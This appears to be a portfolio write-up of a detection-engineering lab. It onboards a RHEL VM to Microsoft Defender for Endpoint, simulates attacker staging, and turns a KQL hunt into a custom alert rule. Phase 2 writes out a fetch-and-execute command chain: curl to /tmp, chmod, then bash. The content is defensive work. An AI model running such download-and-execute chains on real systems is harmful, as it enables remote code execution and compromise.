# Linux RCE (Remote Code Execution) Detection Lab – Microsoft Defender for Endpoint

## ⓘ Overview

This lab was performed in [The Cyber Range](http://joshmadakor.tech/cyber-range), an Azure-hosted enterprise environment where I replicate real-world detection engineering and SOC workflows. For this scenario, I simulated remote code execution (RCE)-style behavior on a Red Hat Enterprise Linux (RHEL 9.4) virtual machine and analyzed how Microsoft Defender for Endpoint (MDE) captures, correlates, and alerts on suspicious command execution patterns.

To generate the signal, I executed a staged command sequence designed to mimic common Linux attacker tradecraft. The activity included downloading a file from an external source into the `/tmp` directory, modifying file permissions to make it executable, and attempting to execute it. This behavior mirrors how attackers frequently stage and run payloads during initial compromise or lateral movement attempts.

Once the activity was generated, MDE immediately captured the corresponding process telemetry through `DeviceProcessEvents`. Using Advanced Hunting, I traced the full event chain, correlating the `curl` download with the subsequent `chmod` and `bash` execution attempts. By analyzing command-line arguments and timestamps, I validated that the behavior followed a clear download → stage → execute pattern rather than normal administrative activity.

After confirming the detection logic through manual hunting, I operationalized the query by converting it into a custom detection rule. The rule correlates download and execution activity within a defined time window and generates an alert whenever the behavior reoccurs. This transforms a one-time hunt into an automated defensive control.

This investigation demonstrates how I simulate attacker techniques on Linux systems, analyze endpoint telemetry in Microsoft Defender for Endpoint, correlate multi-step command execution patterns using KQL, and build custom detection rules that proactively alert on suspicious behavior.

## Environment Details

| Component    | Details                                 |
| ------------ | --------------------------------------- |
| VM Name      | jc-redhat                               |
| OS Image     | Red Hat Enterprise Linux 9.4            |
| Region       | East US 2                               |
| VM Size      | Standard (Azure Marketplace RHEL image) |
| Network      | Cyber-Range-Subnet (shared Azure VNet)  |
| Public IP    | 20.98.221.175                           |
| Subscription | LOG(N) Pacific – Cyber Range 1          |


The [Cyber Range](https://www.skool.com/cyber-range/about?ref=e1dbc80baac24651ae3add002381aab3) is a shared, cloud-based enterprise training environment designed to simulate realistic network architectures and attack scenarios. Each participant operates within a common virtual network where controlled attack simulations can occur safely without affecting production systems.

This VM represents a Linux server onboarded to Microsoft Defender for Endpoint (MDE). I used controlled command-line activity to simulate suspicious execution behavior, then used KQL within MDE Advanced Hunting to detect, correlate, validate, and operationalize the activity into an automated alert.

---

## Phase 1 – Onboarding Linux to Defender

I first onboarded the RHEL VM to Microsoft Defender for Endpoint.

Steps performed:

1. Transferred the onboarding script to the VM using `scp`
2. Installed the Microsoft package repository
3. Installed the Defender agent (`mdatp`)
4. Executed the onboarding script
5. Verified the device was registered
6. Enabled real-time protection

Verification command:

```bash
sudo mdatp health
```

Confirmed:

* `healthy: true`
* `licensed: true`
* `real_time_protection_enabled: true`

<p align="left">
  <img src="assets/Screenshot 2026-02-11 094230.png" width="700">
  <img src="assets/Screenshot 2026-02-12 104359.png" width="700">
</p>

At this stage, the Linux server was actively monitored by Microsoft Defender.

---

## Phase 2 – Simulating Suspicious Behavior

To mimic common attacker staging behavior, I executed the following commands:

```bash
curl http://example.com -o /tmp/update.sh
chmod +x /tmp/update.sh
bash /tmp/update.sh
```

This sequence simulates:

* Downloading content from an external source
* Writing a file into `/tmp`
* Making it executable
* Attempting to execute it

Although the file was harmless HTML, the behavioral pattern matches how attackers commonly stage and execute payloads on Linux systems.

---

## Phase 3 – Threat Hunting with KQL

After generating the behavior, I moved into Advanced Hunting in Microsoft Defender and wrote a KQL query to detect:

* A `curl` download to `/tmp`
* Followed by execution from `/tmp`
* Within a five-minute time window

Example correlation logic:

```kql
(DeviceProcessEvents
| where DeviceName contains "jc-redhat"
| where FileName == "curl"
| where ProcessCommandLine contains "/tmp/"
| project
    DeviceId,
    DeviceName,
    DownloadTime = Timestamp,
    DownloadCmd  = ProcessCommandLine
)
| join kind=inner (
    DeviceProcessEvents
    | where DeviceName contains "jc-redhat"
    | where ProcessCommandLine contains "/tmp/"
    | project
        DeviceId,
        DeviceName,
        Timestamp,
        ReportId,
        ExecTime = Timestamp,
        ExecFile = FileName,
        ExecCmd  = ProcessCommandLine
) on DeviceId
| where ExecTime between (DownloadTime .. DownloadTime + 5m)
| project
    DeviceId,
    Timestamp,      // REQUIRED for custom detection
    ReportId,       // REQUIRED for custom detection
    DeviceName,
    DownloadTime,
    ExecTime,
    DownloadCmd,
    ExecFile,
    ExecCmd
| sort by Timestamp desc
```

This query correlates download activity with execution behavior.

I validated the detection by rerunning the suspicious commands and confirming that the events were returned in Advanced Hunting.

<p align="left">
  <img src="assets/Screenshot 2026-02-12 105836.png" width="700">
  <img src="assets/Screenshot 2026-02-11 141606.png" width="700">
</p>

---

## Phase 4 – Converting the Hunt into a Detection Rule

Once validated, I converted the KQL query into a custom detection rule inside Microsoft Defender.

Configuration included:

* Required fields:

  * DeviceId
  * Timestamp
  * ReportId
* Severity set to High
* Category: Execution
* MITRE ATT&CK Technique: T1059 (Command and Scripting Interpreter)
* Scoped to the lab device group

<p align="left">
  <img src="assets/Screenshot 2026-02-11 144000.png" width="700">
  <img src="assets/Screenshot 2026-02-11 144015.png" width="700">
</p>

After deployment, the detection rule automatically generates an alert whenever this behavior occurs.

<p align="left">
  <img src="assets/Screenshot 2026-02-12 105020.png" width="700">
  <img src="assets/Screenshot 2026-02-12 105112.png" width="700">
</p>

---

## Conclusion

In this project, I simulated attacker-like behavior on a Linux server and built a detection to identify that behavior automatically.

I did not rely on default alerts. Instead, I:

* Generated suspicious activity intentionally
* Verified that endpoint telemetry captured it
* Designed correlation logic in KQL
* Converted that logic into a working detection rule
* Enabled automated alerting

This lab demonstrates how detection logic is built from behavior, validated against real telemetry, and operationalized into a functioning alert within Microsoft Defender for Endpoint.
